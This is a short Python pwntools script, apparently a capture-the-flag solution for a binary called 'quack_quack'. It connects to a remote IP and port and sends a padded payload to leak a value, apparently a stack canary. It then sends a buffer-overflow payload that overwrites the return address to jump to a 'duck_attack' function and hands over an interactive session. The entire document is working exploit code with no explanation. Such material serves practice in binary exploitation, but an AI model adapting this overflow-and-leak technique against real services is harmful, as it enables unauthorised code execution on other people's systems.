from pwn import *

elf = ELF("./quack_quack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

# p = process()
# gdb.attach(p)
p = remote("83.136.254.193", 58965)

payload = b'a' * (102 - 13) + b'Quack Quack '

p.sendline(payload)

p.recvuntil(b'Quack Quack ')
p.recvuntil(b'Quack Quack ')
leak = u64(p.recv(8)[:-1].rjust(8, b'\x00'))
print(hex(leak))

payload = b'a' * 88 + pack(leak) + b'a' * 8 + pack(elf.symbols['duck_attack'])
p.sendline(payload)

p.interactive()
